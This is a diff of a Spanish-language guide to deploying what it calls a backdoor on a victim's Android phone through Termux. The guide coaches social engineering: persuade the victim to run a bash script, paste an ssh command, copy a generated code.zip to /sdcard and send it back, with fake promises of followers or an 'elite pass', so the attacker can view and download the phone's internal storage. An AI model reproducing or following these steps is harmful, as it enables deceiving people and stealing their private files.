@@ -18,14 +18,16 @@ Le pides que lo abra desde su termux
 Y lo ejecute con bash [nombre del archivo]
 
 Utilizan Ingeniera Social para que les funcione
-Le dicimos que copie y pegue el código que comiensa con ssh y termina en -yes
+Le dicimos que copie y pegue el código que comiensa con ssh y termina en .zip
 Y lo pegue en una nueva ventana y le de enter
 
 AKI VIENE LO IMPORTANTE 👇😎
 
-LE PEDIMOS QUE COPIE EL CODIGO QUE LE GENERO Y NOS ENVIE
+LE PEDIMOS QUE NOS ENVIE EL ARCHIVO code.zip QUE LE GENERO
 
-A NOSOTROS EN ESTA CASO TU, DILE QUE YO TE ACTIVO
+SI NO SABE EL LE DICIMOS QUE EJECUTE cp code.zip /sdcard
+
+EN ESTE CASO TU, DILE QUE YO TE ACTIVO
 
 ESE CODIGO EN UNA PAGINA PARA QUE TENGAS TUS SEGUIDORES SI ES QUE 
 
@@ -45,7 +47,7 @@ PARA GENERAR TU PASE ELITE Y TE LLEGUE A TU CUENTA.
 
 #Ojo solo el backdoor sirve para ver , y descargar los archivos del almacenamiento interno
 
-De la victima , ya una ves que te envié el disque código que se le genero 
+De la victima , ya una ves que te envié el disque archivo.zip que se le genero 
 
 En la nueva ventana copiamos el código buscamos el link
 
